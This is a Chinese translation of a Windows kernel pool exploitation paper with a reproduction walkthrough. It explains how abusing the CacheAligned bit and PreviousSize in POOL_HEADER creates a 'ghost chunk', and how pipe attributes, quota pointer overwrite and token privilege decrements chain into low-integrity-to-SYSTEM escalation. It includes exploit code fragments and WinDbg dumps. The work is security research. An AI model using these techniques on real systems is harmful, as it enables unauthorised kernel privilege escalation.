**块排列混淆**

如2.2节中所示，如果一个请求分配的PoolType中的CacheAligned位被设置，那么块的布局是不同的。

当分配器正在释放这种块时，它将尝试寻找原始的块地址，用来在正确的地址释放块。它将在对齐的POOL_HEADER中使用PreviousSize字段。分配器使用一个简单的减法来计算原始块的地址。

    
    
    if ( AlignedHeader ->PoolType & 4 )
    {
    OriginalHeader = (QWORD)AlignedHeader - AlignedHeader ->
    PreviousSize * 0x10;
    OriginalHeader ->PoolType |= 4;
    }

在内核中引入段堆之前，在这个操作之后有几个检查。

  1. 分配器检查原始块在PoolType中是否设置了MustSucceed位。
  2. 使用ExpCacheLineSize重新计算两个头之间的偏移量，并且验证两个头之间的偏移量一样。
  3. 分配器检查对齐的头的BlockSize是否等于原始头的BlockSize加对齐头的PreviousSize。
  4. 分配器检查OriginalHeader中保存的指针加上POOL_HEADER的大小是否等于对齐头的地址与ExpPoolQuotaCookie异或的值。

自Windows 19H1开始，池分配器使用Segment
Heap，所有的检查都不存在了。异或的指针依然存在于原始头之后，但在释放机制中不在进行检查。作者认为有一些检查被错误的删除了。在未来的版本中可能会重新打开这些检查，但是在Windows
10 20H1的预览版中没有这样的补丁。

目前，由于缺乏检查，攻击者可以使用PoolType作为攻击向量。攻击者可以使用堆溢出来设置下一个块的PoolType字段的CacheAligned位，并完全控制PreviousSize字段。当块被释放时，释放机制使用受控的PreviousSize字段寻找原始块，并释放它。因为PreviousSize字段存储在一个字节中，所以攻击者可以在原始块地址之前释放任意对齐在0x10上的地址，最多可达0xFF*0x10=0xFF0。

这篇文章的最后一部分将使用本文介绍的技术演示一个通用漏洞利用。它提供了在池溢出或UAF的情况下需要控制的通用对象，以及使用受控数据重用已释放的分配的多个对象和技术。

## 4 通用的漏洞利用技术

### 4.1 所需条件

这一节的目的是为了介绍利用一个漏洞来实现Windows System权限提升的技术。假设攻击者在低完整性级别。

最终的目的是为了开发最通用的漏洞利用程序，可用于不同类型的内存，PagedPool和NonPagedPoolNx，具有不同大小的块和能够提供以下所需条件的任意堆溢出漏洞。

当目标为BlockSize时，漏洞需要提供用一个可控的值重写下一个块的POOL_HEADER的第三个字节的能力。

当目标为PoolType时，漏洞需要提供用一个可控的值重写下一个块的POOL_HEADER的第一个和第四个字节的能力。

在所有的情况下，都需要控制漏洞对象的分配和释放，以最大限度的提升堆喷射的成功率。

### 4.2利用策略

所选择的利用策略使用攻击下一个块的POOL_HEADER的PoolType和PreviousSize字段的能力。易受堆溢出漏洞影响的块被称为“漏洞块”，放置在其后的块被称为“被覆盖的块“；

正如在3.2节中描述的，通过控制下一个块的POOL_HEADER的PoolType字段和PreviousSize字段，攻击者可以更改被覆盖的块实际释放的位置。可以通过多种方式利用这种原语。

当攻击者将PreviousSize字段设置为漏洞块的大小时，这将允许在UAF的情况下实现池溢出。因此，在请求释放被覆盖的块时，漏洞块将被取代，并处于UAF的状态，图14展示了这个技术。

![image-20210830163011129](https://images.seebug.org/content/images/2021/10/19/1634632886000-14nsiks.png-w331s)

图14. Exploitation using vulnerable chunk Use-After-Free

然而，我们选择了另一种技术。该原语可以被用来在漏洞块的中间触发被覆盖的块的释放。可以在漏洞块中伪造一个假的POOL_HEADER（或者是替换它的块），并且使用PoolType攻击重定向该块上的空闲区。这将允许在合法的块中间创建一个虚假的块，并且处于相当好的溢出情况。这个块相应的被称为“幽灵块”。

幽灵块至少覆盖两个块，漏洞块和被覆盖区块，图15展示了这种技术

![image-20210830173003385](https://images.seebug.org/content/images/2021/10/19/1634632886000-15jrbva.png-w331s)

图15. 选择的利用技术

最后一项利用技术看起来比UAF更好利用，因为它使得攻击者处于更好的状态来控制任意对象的内容。

然后，可以使用允许任何数据控制的对象来重新分配漏洞块。这允许攻击者能够控制部分“幽灵块”中分配的对象。

为了放置“幽灵块”，必须找到一个有趣的对象。为了使漏洞利用程序更加通用，对象应该满足下列要求：

  1. 如果可以完全控制或部分控制的情况下，能提供任意读写原语。
  2. 有能力控制它的分配和释放
  3. 具有最小0x210的可变大小，以便从相应的快表中分配到“幽灵块”中，但要尽可能小（避免在分配时浪费太多堆空间）

由于漏洞块可以放置在PagedPool和NonPagedPoolNx中，因此需要两个此类对象，一个PagedPool中分配，另一个在NonPagedPoolNx中分配。

这种对象不是常见的，所以作者没有发现完美的此类对象。这就是为什么使用仅能提供任意读原语的对象作为开发EXP策略的原语。攻击者依然可以控制幽灵块的POOL_HEADER。这意味着Quota
Pointer Process
Overwrite攻击可以被用于获取任意递减原语。ExpPoolQuotaCookie和幽灵块的地址可以使用任意地址读原语恢复。

开发的利用程序使用的是最后的这个技术。通过利用堆处理和有趣的对象的溢出，实现4个字节溢出转为从低完整性到System完整性的权限提升。

### 4.3 目标对象

分页池创建管道后，用户可以向管道添加属性。属性是存储在链表中的键值对。管道属性对象在分页池中分配，使用下面的内核中的结构体来定义。

    
    
    //PipeAttribute是未公开的结构体
    struct PipeAttribute {
    LIST_ENTRY list;
    char * AttributeName;
    uint64_t AttributeValueSize ;
    char * AttributeValue ;
    char data [0];
    };

分配的大小和填充的数据完全由攻击者控制。属性名和属性值是指向数据区不同偏移的两个指针。

可以使用NtFsControlFile系统调用和0x11003C控制码在管道上创建管道属性，见下图所示的代码

    
    
    HANDLE read_pipe;
    HANDLE write_pipe;
    char attribute [] = "attribute_name \00 attribute_value"
    char output [0 x100 ];
    CreatePipe(read_pipe , write_pipe , NULL , bufsize);
    NtFsControlFile (write_pipe ,
    NULL ,
    NULL ,
    NULL ,
    &status ,
    0x11003C ,
    attribute ,
    sizeof(attribute),
    output ,
    sizeof(output)
    );

可以使用0x110038控制码来读取属性值。属性值指针和属性值大小将被用于读取属性值并返回给用户。属性值可以被修改，但这会触发先前的PipeAttribute的释放和新的PipeAttribute的分配。

这意味着如果攻击者可以控制PipeAttribute结构体的AttributeValue和AttributeValueSize字段，它就可以在内核中任意读取数据，但不能任意写。这个对象也非常适合在内核中放置任意数据。这意味着它可以用来申请一个漏洞块并控制幽灵块的内容。

**NonPagedPoolNx**

在管道中使用WriteFile是一种众所周知的NonPagedPoolNx喷射技术。当往管道中写入时，NpAddDataQueueEntry函数会创建下图所示的结构体

    
    
    struct PipeQueueEntry
    {
    LIST_ENTRY list;
    IRP *linkedIRP;
    __int64 SecurityClientContext ;
    int isDataInKernel ;
    int remaining_bytes__ ;
    int DataSize;
    int field_2C;
    char data [1];
    };

PipeQueueEntry的大小和数据是由用户控制的，因为数据直接存储在结构体后面。

当使用函数NpReadDataQueue中的条目时，内核将会遍历条目列表，并使用条目来检索数据。

    
    
    if ( PipeQueueEntry -> isDataAllocated == 1 )
        data_ptr = (PipeQueueEntry ->linkedIRP ->SystemBuffer);
    else
        data_ptr = PipeQueueEntry ->data;
    [...]
    memmove (( void *)(dst_buf + dst_len - cur_read_offset ), &data_ptr[
        PipeQueueEntry ->DataSize - cur_entry_offset ], copy_size);

如果isDataAllocated字段等于1，则数据没有直接存储在结构体后面，但是其指针存储在IRP中，由linkedIRP指向。如果攻击者能够完全控制这个结构体，他可以设置isDataInKernel为1，并且使指针linkIRP在用户层。然后使用用户层的LinkedIRP字段的SystemBuffer字段（偏移0x18）读取条目中的数据。这就提供了一个任意读原语。这个对象也非常适合在内核中存储任意数据。它可以被用于申请一个易受攻击的块且控制幽灵块的内容。

### 4.4 喷射

本节描述了喷射内核堆以获取所需的内存布局的技术。

为了获取4.2节中介绍的内存布局，必须要进行一些堆喷射。堆喷取决于漏洞块的大小，因为它最终会在不同的分配后端中。

为了便于喷射可以确保相应的快表是空的。分配超过256个大小合适的块可以确保这一点。

如果漏洞块小于0x200，那么它将位于LFH后端。然后，喷射将会在完全相同的块中完成，对相应的bucket粒度求模？以确保他们都从同一个bucket中分配。正如2.1节的介绍，当请求分配时，LFH后端将扫描最多以32个block块为一组的BlockBitmap，并随机选择一个空闲块。在分配的漏洞块的前后各分配超过32个合适大小的块应该可以对抗随机化。

如果漏洞块大于0x200但小于0x10000，最终它将在可变大小后端中。然后喷射将以漏洞块的大小完成。过大的块会被分开，因此堆喷将会失败。首先，分配上千个选中大小的块，以确保清空所有FreeChunkTree中大于选中大小的块，然后分配器将分配一个0x10000字节大小的新的VS子段并放在FreeChunkTree中。然后再分配上千个块，最终都位于一个新的大空闲块，因此是连续的。然后释放最后分配的块的三分之一，以填充FreeChunkTree。仅仅释放三分之一以确保没有块被合并。然后使得漏洞块被分配。最终，释放的块将被重新分配以最大限度的增加喷射机会。

由于所有的利用技术都需要释放和重新分配漏洞块和幽灵块，因此启动相应的动态快表以简化空闲块的恢复真的非常有趣。为此，一个简单的方案是分配上千个相应大小的块，等两秒，分配另外上千个块并等一秒。因此，我们可以确保平衡管理器重新平衡了相应的快表。分配上千个块以确保快表在最常使用的快表中，因此将被打开并且确保有足够的空间。

### 4.5 利用

**演示设置** 为了演示下面的利用，创建了一个虚假的漏洞。

开发了一个windows驱动，暴露了许多IOCTL，他们可以：

  * 在PagedPool中分配一个大小可控的块
  * 在块中触发一个受控的memcpy，实现一个受控的池溢出
  * 释放分配的块

当然，这仅仅是为了做一个演示，并且提供了更多漏洞利用所需的控制。

这些设置允许攻击者可以：

  * 控制漏洞块的大小，这不是强制的，但是最好可以实现，因为可控的大小会简化漏洞利用。
  * 控制漏洞块的分配和释放
  * 使用受控的值覆盖下一个块的POOL_HEADER的前4个字节

当然，漏洞块分配在PagedPool中。这非常重要，因为池的类型也许会改变在利用中使用的对象，同时对利用程序自身也有很大的影响。此外，针对NonPagedPoolNx的利用是非常相似的，仅使用PipeQueueEntry就可以取代PipeAttribute，实现喷射并得到任意读原语。

对于这个例子，将选择0x180作为漏洞块的大小。关于漏洞块的大小和漏洞利用中的影响将在4.6节中讨论。

**创建幽灵块** 这里的第一步是处理堆，以便在漏洞块后放置受控的对象。

用来覆盖块的对象可以是任意的，唯一需要控制的是什么时候释放。为了简化利用，最好选择一个可以被喷射对象，在4.2节中可以看到。

现在可以触发漏洞了，被覆盖的POOL_HEADER要被以下值取代：

  * PreviousSizes：0x15。此大小将乘以0x10。0x180-0x150=0x30，漏洞块中虚假的POOL_HEADER的偏移。
  * PoolIndex：0，或者是任意值，这个值没有使用
  * BlockSize：0，或者是任意值，这个值没有使用
  * PoolType：PoolType|4，设置CacheAligned位

![image-20210831191931528](https://images.seebug.org/content/images/2021/10/19/1634632887000-16qofcy.png-w331s)

图16. 触发溢出

虚假的POOL_HEADER必须放在漏洞块的已知偏移处。这是通过释放漏洞块对象且使用PipeAttribute对象重新分配块实现的。

为了演示，虚假POOL_HEADER在易受攻击的块偏移0x30位置处。虚假的POOL_HEADER格式如下：

  * PreviousSize：0，或任意值，这个值没有被使用
  * PoolIndex：0，或任意值，这个值没有被使用
  * BlockSize：0x21，这个值将乘以0x10，且是已释放的块的大小
  * PoolType：PoolType，不要设置CacheAligned和PoolQuota位

BlockSize的选择不是随机的，它是实际要释放的块的大小。由于目标是在之后重用此分配，因此需要选一个易于重用的大小。由于所有小于0x200的块都在LFH中，因此必须避免这样的大小。不在LFH中的最小大小为0x200，块的大小为0x210。0x210大小使用VS
分配器，并且有资格使用2.1节中描述的动态快表。

可以通过喷射和释放0x210字节的块来启用。

现在可以释放被覆盖的块，并且这将触发缓存对齐。它将在OverwritenChunkAddress-（0x15*0x10）处释放区块，也是VulnerableChunkAddress+0x30处，而不是在被覆盖区块的地址释放区块。用于释放的块POOL_HEADER是虚假POOL_HEADER，内核并没有释放漏洞的块，而是释放了一个0x210大小的块，并且将其放在动态链表的顶部。在图17中进行了展示。

![image-20210831202539212](https://images.seebug.org/content/images/2021/10/19/1634632887000-17yzfjq.png-w331s)

图17. 释放被覆盖的块

不幸的是，虚假POOL_HEADER的PoolType对释放的块是放在PagedPool还是NonPagedPoolNx中没有影响。

动态快表是由分配的段来选择的，该段是从块的地址派生的。它意味着如果漏洞块在Paged Pool中，那么幽灵块将被放在Paged Pool的快表中。

覆盖的块现在处于丢失状态；内核认为它已经释放了，并且块上的所有引用都已经被删除。它将不会再被使用了。

**泄露幽灵块的内容**
幽灵块现在也可以使用PipeAttribute对象重新分配。PipeAttribute结构会覆盖放在漏洞块的属性值。通过读此管道的属性值，就可以导致幽灵块的PipeAttribute属性内容被泄露。现在已知幽灵块和漏洞块的地址。这一步在图18中介绍了。

![image-20210901153119038](https://images.seebug.org/content/images/2021/10/19/1634632887000-18rspkf.png-w331s)

图18. 泄露幽灵块的属性

**得到一个任意读原语**
可以再次释放漏洞块，并使用其他的PipeAttribute再次分配。这时，PipeAttribute的数据将覆盖幽灵块的PipeAttribute。因此，幽灵块的PipeAttribute属性将被完全控制。一个新的PipeAttribute属性将被注入到位于用户层的列表中。这一步在图19中进行了介绍。

![image-20210901160217586](https://images.seebug.org/content/images/2021/10/19/1634632888000-19ncloc.png-w331s)

图19. 复写幽灵块的PipeAttribute

现在，通过请求读取幽灵块的PipeAttribute属性，内核将使用用户层的PipeAttribute，因此可以实现完全控制。正如之前看到的，通过控制属性值指针和属性值大小，可以提供到一个任意读原语。图20介绍了一个任意读原语。

![image-20210901161530637](https://images.seebug.org/content/images/2021/10/19/1634632888000-20lolsb.png-w331s)

图20. 使用注入的 PipeAttribute 进行任意读取

使用泄露的第一个指针和任意读原语，可以检索npfs的代码节上的指针。通过读取导入表，可以读取ntoskrnl代码节上的指针，它可以提供内核的基址。从那儿开始，攻击者能够读取ExpPoolQuotaCookie值，并检索EXP进程的EPROCESS结构体的地址和TOKEN的地址。

**得到一个任意递减原语** 首先，使用PipeQueueEntry在内核区精心制作一个虚假的EPROCESS结构，并使用任意读来检索它的地址。

然后，EXP可以再次释放和重新分配漏洞块，来改变幽灵块的内容和POOL_HEADER。

幽灵块的POOL_HEADER被下列值覆盖：

  * PreviousSize：0，或者任意值，这个值没有使用
  * PoolIndex：0，或者任意值，这个值没有使用
  * BlockSize：0x21，这个值将乘以0x10
  * PoolType：8，PoolQuota位被设置
  * PoolQuota：ExpPoolQuotaCookie 异或FakeEprocessAddress 异或 GhostChunkAddress

释放幽灵块后，内核将尝试解引用与EPROCESS相关的Quota counter。它将使用虚假EPROCESS结构体来寻找要解引用的指针值。

这将提供任意递减原语。递减的值是PoolHeader中的BlockSize，所以它在0x0到0xff0以0x10对齐。

**从任意递减到System权限** 在2012年，Cesar
Cerrudo[3]描述了一种通过设置TOKEN结构体的Privileges.Enable字段来实现权限提升的技术。

Privileges.Enable字段保存了这个进程开启的权限。默认情况下，低完整性的Token的Privileges.Enable字段被设置为0x0000000000800000，这个值只会授予SeChangeNotifyPrivilege。将此位的值减去1，它将变成
0x000000000007fff，这将启用更多的权限。

在bit字段上设置第20bit，可以启用SeDebugPrivilege。SeDebugPrivilege允许一个进程调试系统上的任意进程。因此有能力注入任意代码到特权进程。

EXP在[1]介绍了配额进程指针覆盖（Quota Pointer Process
Overwrite），可以使用任意递减原语来设置其进程的SeDebugPrivilige权限。图21对这个技术进行了介绍。

![image-20210901173911511](https://images.seebug.org/content/images/2021/10/19/1634632889000-21pvegb.png-w331s)

图21. EXP利用任意递减原语获得SYSTEM权限

然而，自windows 10
v1607开始，内核开始检查Token结构体的Privileges.Present字段的值。Token的Privileges.Present字段可以通过使用AdjustTokenPrivileges
API开启权限列表。所以，Token的实际权限，现在是由Privileges.Present & Privileges.Enable的位域结果来定的。

默认情况下，低完整性级别的Token的Privileges.Present被设置为0x602880000。因为0x602880000 & (1<<20)
==0，在Privileges.Enabled中设置SeDebugPrivilege不足以获取SeDebugPrivilege。

为了获得Privileges.Present
bitfield中的SeDebugPrivilege，一个想法是递减Privileges.Present的bitfield。然后，攻击者可以使用AdjustTokenPrivileges
API来打开SeDebugPrivilege。然而，SepAdjustPrivileges函数额外进行了检查，并且这取决于Token的完整性，一个进程不能启用任意权限，即使需要的权限在Privileges.Present的bitfield中。对于高完整性级别，进程可以启用Privileges.Present位域中的任何权限。对于中完整性级别，一个进程只能开启Privileges.Present特权和0x1120160684位域。对于低完整性级别，一个进程只能开启Privileges.Present特权和0x202800000位域。

这意味着从单一的任意递减原语获取SYSTEM权限的技术已经凉凉。

但是，它完全可以用两种任意递减原语来实现，先递减Privileges.Enable，然后递减Privileges.Present。

幽灵块可以被重新分配，且它的POOL_HEADER可以被再次覆盖，来获得第二个任意递减。

一旦再次获取到SeDebugPrivilege，EXP即可打开任意SYSTEM权限进程，并注入shellcode实现弹出一个SYSTEM权限的shell。

### 4.6 讨论当前的EXP

所提供的漏洞利用代码可在 [2] 处获得，以及易受攻击的驱动程序。 这个漏洞只是一个概念证明，可以随时改进。

### 4.7 讨论漏洞对象的大小

根据易受攻击对象的大小，漏洞利用可能有不同的要求。

上述漏洞利用仅适用于最小大小为 0x130 的漏洞块。这是因为幽灵块的大小必须至少为0x210。

对于大小低于 0x130 的漏洞块，幽灵块的分配将覆盖被覆盖块后面的块，并在释放时触发崩溃。这是可修复的，但是留给读者自己去练习吧。

在LFH的漏洞对象（小于0x200的块）和VS段的漏洞对象（大于0x200）之间有一些不同。主要的是，在VS块的前面有额外的头。它意味着能够控制VS
segment 的下一个块的POOL_HEADER，至少需要堆溢出0x14个字节。这也意味着当覆盖的块将被释放时，它的
_HEAP_VS_CHUNK_HEADER
必须已修复。另外，要注意的是不能释放覆盖的块之后2个喷射了合适大小的块，因为VS的释放机制也许会读覆盖的块的头部企图合并3个空闲块。

最后，LFH和VS中的堆处理是相当不同的，正如4.4节中讲到的。

## 5 结论

这篇文章描述了自Windows 10
19H1以来池内部的一个状态。段堆被引入内核且不需要元数据来正常工作。然后，旧的POOL_HEADER依旧存在于每个块的头部，但用法不同。

我们演示了一些在内核中使用堆溢出的攻击，通过攻击特定池的内部。

演示的EXP可以适应任意可以提供最小堆溢出的漏洞，就可以实现从低完整性到SYSTEM完整性的本地权限提升。

## 6 引用

  1. Corentin Bayet. Exploit of CVE-2017-6008 with Quota Process Pointer Overwrite attack. https://github.com/cbayet/Exploit-CVE-2017-6008/blob/master/Windows10PoolParty.pdf, 2017.

  2. Corentin Bayet and Paul Fariello. PoC exploiting Aligned Chunk Confusion on Windows kernel Segment Heap. https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion, 2020.

  3. Cesar Cerrudo. Tricks to easily elevate its privileges. https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf, 2012.

  4. Matt Conover and w00w00 Security Development. w00w00 on Heap Overflows. http://www.w00w00.org/files/articles/heaptut.txt, 1999.

  5. Tarjei Mandt. Kernel Pool Exploitation on Windows 7. Blackhat DC, 2011.

  6. Haroon Meer. Memory Corruption Attacks The (almost) Complete History. BlackhatUSA, 2010.

  7. Mark Vincent Yason. Windows 10 Segment Heap Internals. Blackhat US, 2016.

## 7 复现

原作者在写这边文章的同时，提供了一个demo用演示上述文章内提到的利用技术，这里我们来复现这个demo。

demo总共分为两部分，分别为漏洞驱动程序和EXP。漏洞驱动使用Visual Studio编译，EXP需要使用GCC编译。

demo本身实现了两种后端分配器（LFH和VS）的利用，但是在上述文章中是以LFH来进行讲解，所以我们复现也以LFH后端进行复现。

这里我们按照EXP的执行流程进行分析，关于EXP中如何创建管道，如何构造Pipe_Attribute等内容，都很好理解，自行阅读源码即可，就不浪费时间分析了，这里主要复现和分析漏洞利用的关键过程。

## 1\. 申请漏洞块

使用已经构造好的pipe_attribute来给管道设置属性，实现可以预测的漏洞块的申请。

    
    
    spray_pipes(spray1);
    uintptr_t vuln = alloc_vuln(xploit);
    printf("Vulnerable allocation is at 0x%016llX", vuln);
    spray_pipes(spray2);
    //spray1和spray2是构造好的pipe_attribute属性

申请的漏洞块如下所示

    
    
     0: kd> !pool 0xFFFFB80008CFB3F0
    Pool page ffffb80008cfb3f0 region is Paged pool
     ffffb80008cfb0c0 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfb250 size:  190 previous size:    0  (Allocated)  NpAt
    *ffffb80008cfb3e0 size:  190 previous size:    0  (Allocated) *VULN //这里就是申请的漏洞块
            Owning component : Unknown (update pooltag.txt)
     ffffb80008cfb570 size:  190 previous size:    0  (Allocated)  NpAt //与漏洞块相邻的是即将被漏洞块溢出后所覆盖的块，之后我们称之为相邻块
     ffffb80008cfb700 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfb890 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfba20 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfbbb0 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfbd40 size:  190 previous size:    0  (Allocated)  NpAt

触发漏洞前，漏洞块和相邻块的原始值

    
    
    0: kd> dq ffffb80008cfb3e0
    ffffb800`08cfb3e0  4e4c5556`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  00009d70`0000000a ffffffff`00000168
    ffffb800`08cfb400  00000000`00000000 00000056`0000003a
    ffffb800`08cfb410  0000000a`00000000 7865646e`49707041
    ffffb800`08cfb420  00000000`00007265 000f6b76`ffffffd8
    ffffb800`08cfb430  00009670`0000001e 00000001`05f5e10c
    ffffb800`08cfb440  4c646578`65646e49 00656761`75676e61
    ffffb800`08cfb450  72c66400`fffffff0 00000101`d7ac7dbd
    0: kd> dt nt!_POOL_HEADER ffffb80008cfb3e0
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00011001 (0x19)
       +0x002 PoolType         : 0y00000011 (0x3)
       +0x000 Ulong1           : 0x3190000
       +0x004 PoolTag          : 0x4e4c5556
       +0x008 ProcessBilled    : 0xffffffff`ffffffff _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0xffff
       +0x00a PoolTagHash      : 0xffff
    0: kd> dq ffffb80008cfb570
    ffffb800`08cfb570  7441704e`03196900 00000000`ffffffe8 //触发漏洞后，相邻块的POOL_HEADER会被修改
    ffffb800`08cfb580  ffffb800`09069850 ffffb800`09069850
    ffffb800`08cfb590  ffffb800`08cfb5a8 00000000`00000156
    ffffb800`08cfb5a0  ffffb800`08cfb5aa 41414141`4141005a
    ffffb800`08cfb5b0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5c0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5d0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5e0  41414141`41414141 41414141`41414141
    0: kd> dt nt!_POOL_HEADER ffffb80008cfb570
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y01101001 (0x69)
       +0x002 BlockSize        : 0y00011001 (0x19)
       +0x002 PoolType         : 0y00000011 (0x3)
       +0x000 Ulong1           : 0x3196900
       +0x004 PoolTag          : 0x7441704e
       +0x008 ProcessBilled    : 0x00000000`ffffffe8 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0xffe8
       +0x00a PoolTagHash      : 0xffff

## 2\. 触发漏洞

对漏洞块执行复制操作，使其发生溢出，修改相邻块的POOL_HEADER，接着释放漏洞块，同时使用respray再次占用漏洞块。使用respray再次占用漏洞块的目的是为了给幽灵块构造一个POOL_HEADER。

    
    
    trigger_vuln(xploit, overflow, xploit->offset_to_pool_header + 4);
    free_vuln();
    spray_pipes(xploit->respray);

触发漏洞后，相邻块的POOL_HEADER如下

    
    
    0: kd> !pool 0xFFFFB80008CFB3F0
    Pool page ffffb80008cfb3f0 region is Paged pool
     ffffb80008cfb0c0 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfb250 size:  190 previous size:    0  (Allocated)  NpAt
    *ffffb80008cfb3e0 size:  190 previous size:    0  (Allocated) *NpAt
            Owning component : Unknown (update pooltag.txt)
    //因为我们已经通过溢出修改了相邻块的POOL_HEADER,所以系统认为当前的相邻块不是有效的池分配。
    ffffb80008cfb570 doesn't look like a valid small pool allocation, checking to see
    if the entire page is actually part of a large page allocation...
    
    ffffb80008cfb570 is not a valid large pool allocation, checking large session pool...
    Unable to read large session pool table (Session data is not present in mini and kernel-only dumps)
    ffffb80008cfb570 is not valid pool. Checking for freed (or corrupt) pool
    Bad allocation size @ffffb80008cfb570, zero is invalid
    
    ***
    *** An error (or corruption) in the pool was detected;
    *** Attempting to diagnose the problem.
    ***
    *** Use !poolval ffffb80008cfb000 for more details.
    
    
    Pool page [ ffffb80008cfb000 ] is INVALID.
    
    Analyzing linked list...
    
    
    Scanning for single bit errors...
    
    None found
    
    0: kd> dq ffffb80008cfb3e0 //这里是被respray再次占用的漏洞块
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  ffffb800`09109830 ffffb800`09109830
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 42424242`4242005a
    ffffb800`08cfb420  ffffffaf`00210000 42424242`42424242 //respray对原始的pipe_attribute值进行了修改，这里被赋值为幽灵块的POOL_HADER
    ffffb800`08cfb430  42424242`42424242 42424242`42424242
    ffffb800`08cfb440  42424242`42424242 42424242`42424242
    ffffb800`08cfb450  42424242`42424242 42424242`42424242
    0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00100001 (0x21) //幽灵块的大小 0x210/0x10
       +0x002 PoolType         : 0y00000000 (0)
       +0x000 Ulong1           : 0x210000
       +0x004 PoolTag          : 0xffffffaf
       +0x008 ProcessBilled    : 0x42424242`42424242 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0x4242
       +0x00a PoolTagHash      : 0x4242
    0: kd> dq ffffb80008cfb570
    ffffb800`08cfb570  7441704e`04000015 00000000`ffffffe8 //可以看到，相邻块的POOL_HEADER已被修改
    ffffb800`08cfb580  ffffb800`09069850 ffffb800`09069850
    ffffb800`08cfb590  ffffb800`08cfb5a8 00000000`00000156
    ffffb800`08cfb5a0  ffffb800`08cfb5aa 41414141`4141005a
    ffffb800`08cfb5b0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5c0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5d0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5e0  41414141`41414141 41414141`41414141
    0: kd> dt nt!_POOL_HEADER dq ffffb80008cfb570
    Cannot find specified field members.
    0: kd> dt nt!_POOL_HEADER ffffb80008cfb570
       +0x000 PreviousSize     : 0y00010101 (0x15)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00000000 (0)
       +0x002 PoolType         : 0y00000100 (0x4)
       +0x000 Ulong1           : 0x4000015
       +0x004 PoolTag          : 0x7441704e
       +0x008 ProcessBilled    : 0x00000000`ffffffe8 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0xffe8
       +0x00a PoolTagHash      : 0xffff

从上图我们可以看到，相邻块的POOL_HEADER中PreviousSize和PoolType已经被修改，且PoolType的CacheAligned位被设置，那么从原作者的文章中我们可以了解到，当一个块的PoolType的CacheAligned位被设置，那么在释放这个块时，它将尝试寻找原始的块地址，以便正确的释放此块。

原始块地址计算方法如下：

    
    
    if ( AlignedHeader ->PoolType & 4 )
    {
        OriginalHeader = (QWORD)AlignedHeader - AlignedHeader ->PreviousSize * 0x10;
        OriginalHeader ->PoolType |= 4;
    }

由上面的调试可知，原始的块地址为：`ffffb80008cfb570 - 0x15 * 0x10 = ffffb80008cfb420`

通过释放相邻块，即可触发对幽灵块的释放，所以我们将会得到一个大小为0x210的空闲堆。

## 3\. 申请幽灵块

对相邻块进行释放，即可得到一个空闲的大小为0x210的幽灵块

    
    
    spray_pipes(xploit->lookaside1);
    sleep(2);
    spray_pipes(xploit->lookaside2);
    sleep(1);
    free_pipes(spray1);
    free_pipes(spray2);//这里对相邻块进行了释放
    printf("[+] Alloc ghost !\n");
    xploit->alloc_ghost_chunk(xploit, attribute);//通过给管道设置属性，来申请刚刚释放的幽灵块。

申请到的幽灵块如下

    
    
    0: kd> dq ffffb80008cfb3e0
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff //这里是通过respray重新占用的漏洞块的POOL_HEADER,大小为0x190
    ffffb800`08cfb3f0  ffffb800`09109830 ffffb800`09109830
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 42424242`4242005a
    ffffb800`08cfb420  7441704e`03210000 42424242`42424242 //这里是幽灵块，大小为0x210
    ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190
    ffffb800`08cfb440  ffffb800`08cfb458 00000000`000001d6
    ffffb800`08cfb450  ffffb800`08cfb45a 43434343`4343005a
    0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00100001 (0x21)
       +0x002 PoolType         : 0y00000011 (0x3)
       +0x000 Ulong1           : 0x3210000
       +0x004 PoolTag          : 0x7441704e
       +0x008 ProcessBilled    : 0x42424242`42424242 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0x4242
       +0x00a PoolTagHash      : 0x4242
    0: kd> dq ffffb800`08cfb420
    ffffb800`08cfb420  7441704e`03210000 42424242`42424242
    ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190
    ffffb800`08cfb440  ffffb800`08cfb458 00000000`000001d6
    ffffb800`08cfb450  ffffb800`08cfb45a 43434343`4343005a
    ffffb800`08cfb460  43434343`43434343 43434343`43434343
    ffffb800`08cfb470  43434343`43434343 43434343`43434343
    ffffb800`08cfb480  43434343`43434343 43434343`43434343
    ffffb800`08cfb490  43434343`43434343 43434343`43434343

